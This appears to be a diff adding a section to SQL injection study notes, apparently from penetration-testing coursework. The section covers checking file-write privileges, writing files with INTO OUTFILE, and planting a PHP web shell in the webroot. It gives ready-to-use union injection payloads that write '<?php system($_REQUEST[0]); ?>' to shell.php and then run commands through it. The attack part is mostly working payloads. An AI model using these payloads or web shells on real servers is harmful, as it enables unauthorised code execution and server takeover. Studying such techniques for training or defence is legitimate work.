@@ -893,3 +893,77 @@ SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND
   - Displays the source code of `search.php`.
 
 ---
+
+# Writing Files using SQL Injections
+
+#### Write File Privileges
+
+- **Requirements**:
+  - User with `FILE` privilege enabled.
+  - MySQL global `secure_file_priv` variable not enabled.
+  - Write access to the desired location on the back-end server.
+
+#### Checking Write File Privileges
+
+- **Determine Current User**:
+  ```sql
+  SELECT USER();
+  SELECT CURRENT_USER();
+  SELECT user FROM mysql.user;
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, user(), 3, 4-- -
+  ```
+
+#### Checking `secure_file_priv`
+
+- **Purpose**: Determines where files can be read/written from.
+- **Query**:
+  ```sql
+  SHOW VARIABLES LIKE 'secure_file_priv';
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
+  ```
+
+#### SELECT INTO OUTFILE
+
+- **Purpose**: Write data from `SELECT` queries into files.
+- **Example**: Exporting data from a table to a file.
+  ```sql
+  SELECT * FROM users INTO OUTFILE '/tmp/credentials';
+  ```
+- **Writing a String to a File**:
+  ```sql
+  SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+  ```
+
+#### Writing Files through SQL Injection
+
+- **Example**: Writing a text file to the webroot.
+  ```sql
+  SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt';
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
+  ```
+
+#### Writing a Web Shell
+
+- **Purpose**: Execute commands on the back-end server.
+- **PHP Web Shell Code**:
+  ```php
+  <?php system($_REQUEST[0]); ?>
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+  ```
+- **Executing Commands via Web Shell**:
+  - URL: `http://SERVER_IP:PORT/shell.php?0=id`
+  - **Output**: Displays the result of the `id` command, confirming code execution.
+
+---
